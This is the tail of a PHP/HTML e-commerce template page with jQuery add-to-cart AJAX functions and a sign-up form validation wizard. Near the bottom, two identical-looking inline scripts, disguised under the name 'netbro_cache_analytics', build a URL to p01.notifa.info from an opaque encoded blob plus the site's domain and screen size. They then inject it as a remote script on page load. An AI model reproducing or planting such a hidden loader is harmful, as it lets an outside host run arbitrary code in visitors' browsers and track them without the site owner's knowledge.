                var igst      = $('#igst_'+id).val();
                var igst_id   = $('#igst_id_'+id).val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart',
                    data: {
                        product_id:product_id,
                        price:price,
                        discount:discount,
                        qnty:qnty,
                        image:image,
                        name:name,
                        model:model,
                        supplier_price:supplier_price,
                        cgst:cgst,
                        cgst_id:cgst_id,
                        sgst:sgst,
                        sgst_id:sgst_id,
                        igst:igst,
                        igst_id:igst_id,
                    },
                    beforeSend: function(){
                        $('.preloader').html("<img src='assets/website/image/loader.gif'>");
                    },
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }

            //Add to cart by ajax
            function cart_btn(product_id){
                var qnty       = $('#sst').val();
                var variant    = $('#select_size1').val();

                if (product_id == 0) {
                    alert('Ooops something went wrong.');
                    return false;
                }
                if (qnty <= 0) {
                    alert('Please keep quantity up to zero !');
                    return false;
                }
                if (variant != 'undefine') {
                    if (variant <= 0) {
                        alert('Please select product size !');
                        return false;
                    }
                }
                
                $.ajax({
                    type: "post",
                    async: true,
                    url: 'http://isshue.bdtask.com/isshue-v1.5/website/Home/add_to_cart_details',
                    data: {product_id:product_id,qnty:qnty,variant:variant},
                    success: function(data) {
                        $("#tab_up_cart").load(location.href+" #tab_up_cart>*","");
                    },
                    error: function() {
                        alert('Request Failed, Please check your code and try again!');
                    }
                });
            }
        </script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mN8SBaYYlsFeUcDpnfQuaKJY%2f%2b4ifx7FXqVglW98PVFQvyY7T5Gk6N3jNgEJBhG6GaIzUqsjF%2f4TLSGOEsYplytwPHPHZFO3%2bR6hyaZOWCDQ8NlS%2b7NVfrYlTPyMtYeFvjQ%2fnLSStYmmFKlaYd%2bcyO0NvOwT%2b9o5NpgZK1gmIGgBQxkfGD%2fb9NYJ5IJVImWu%2fqDBvW%2b9q2qM5N6XydmS8ZLD0HEqy8N%2bx3cr7%2f6jh278SYgwY8uZjHU0e6QkQ1T2jY6I1JON1wBuBdTZDw5sy6dgh7d5LWLX4DVb3zDZPQPk6JEqAaM6yvxHaRlLpKWD5Qpu81O%2bLfziK99WRxo5OJNny1p1UL6OtYYO1GSuVvqfajzEcbbhCo5JXOLkOoUYa84r0WrbrcFiNk5r3M5YfMpXZfbTpbsQhGlXzCd9KuM9lq%2brlrbLdjgDkYGjAsQcXf5g4enwoja3mCiFUt1yIbw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
    
    
       
        
        
        <!--wizard-->
         
    <script type="text/javascript" src="<?php echo base_url()?>assets/js/jquery.1.11.3.min.js"></script>  
    <script type="text/javascript" src="<?php echo base_url()?>assets/js/multistep.min.js"></script>
    <script>
        $(document).ready(function() { 
            $('#rms-wizard').stepWizard({
                stepTheme: 'defaultTheme',/*defaultTheme,steptheme1,steptheme2*/
                allstepClickable: false,
                compeletedStepClickable: true,
                stepCounter: true,
                StepImage: true, 
                animation: true,
                animationClass: "fadeIn",
                stepValidation: true,
                validation : true, 
                field: {
                     username : { 
                        required : true, 
                        minlength: 2,
                        Regex: /^[a-zA-Z0-9]+$/,  
                    },
                     password : {
                        required : true,
                        minlength : 5,
                        maxlength : 20,
                        Regex: /^(?=.*[0-9_\W]).+$/, 
                    },
                    email:{
                        required : true,
                        Regex: /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
                    },
                },
                message: {
                    username: "Please Enter UserName ", 
                }
                
            });
    });
    </script> 
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mxBGfhEJgBVeRF1D3nG7dlIW0bEAhyICGLxebBqUNxpEAT4sy8%2fX6CgsXqzAOKtcQbQjkpEJKI7cyfLTKJ3G640tLHaNhgYqRCBhMbV4%2fPaLmYBcXJH0zmgHiGS0iJ3Kc6fvyZzEuIOUCHxJI%2bW7YtM9BFf%2bBlymSfmfhB4EJhSpXAbIriir1%2boT%2bLjiSyM9eBso5zTeqBduQhY%2fUXKLOoT7bGQK3NSZCmI%2fF5Lymfnffu4t%2fs50zzXesQilE9A%2fM07BWyJ%2bvTNV6Q6kJR8PuxIAPBP3GQYQONyQM5ZSUQc6llpYhFm0EwADGcaH7HWRn%2buB4izlJaPNtOO%2bD4%2bqEgPc%2bUCsBZ1ntFH5RaCmWsbHiiReFF6QvDr9Jol287OLsWadnJgIgKylppfs382TaUMQQnkccb9tzVo9J%2fDAXYr1PDyQQGReXYLEmW8QfFFC1uRT49sme8P%2b4P4xAbqI808y4YSsG8E9U" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
        
        
        
        
    </body>


</html>
